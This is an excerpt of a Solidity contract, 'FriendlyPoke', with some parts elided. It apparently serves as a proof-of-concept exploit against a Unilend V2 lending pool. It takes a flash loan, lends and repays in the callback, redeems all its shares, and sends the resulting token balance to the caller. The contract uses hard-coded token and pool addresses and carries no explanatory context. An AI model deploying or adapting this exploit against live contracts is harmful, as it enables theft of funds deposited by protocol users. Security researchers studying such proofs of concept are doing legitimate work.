...
contract FriendlyPoke is IFlashLoanReceiver{
    ...
    {
        core = IUnilendV2Core(coreaddress);
   ...
   function executeOperation(address _reserve, uint256 _amount, uint256 _fee, bytes calldata _params) override external 
    {
        ...
        // lend 4000
        IERC20 token1Contract = IERC20(0xC783F19c3ac1De293321725d0f92f15a411Da0a4);
        token1Contract.approve(address(core), 5000);   
        core.lend(0x6E30af3B7E1df0C75ef56d4c6271Af53c6196de8, 4000);
        
        //return the loan + fee
        bool result = IERC20(_reserve).transfer(msg.sender, _amount+_fee); 
        require(result, "Fail to return the loan.");
        emit log(_params);
        
        // redeem all the shares
        (, uint sharetoken1) = core.shareOfUserToken1(0x6E30af3B7E1df0C75ef56d4c6271Af53c6196de8, address(this));
        core.redeem(0x6E30af3B7E1df0C75ef56d4c6271Af53c6196de8, int(sharetoken1), address(this));

    }

    function MyPoke() public {
        bytes memory _params = "nothing much";
    
        core.flashLoan(address(this), 0x6E30af3B7E1df0C75ef56d4c6271Af53c6196de8, 200000, _params);
        IERC20 token1Contract = IERC20(0xC783F19c3ac1De293321725d0f92f15a411Da0a4);
        token1Contract.transfer(msg.sender, token1Contract.balanceOf(address(this)));
    }
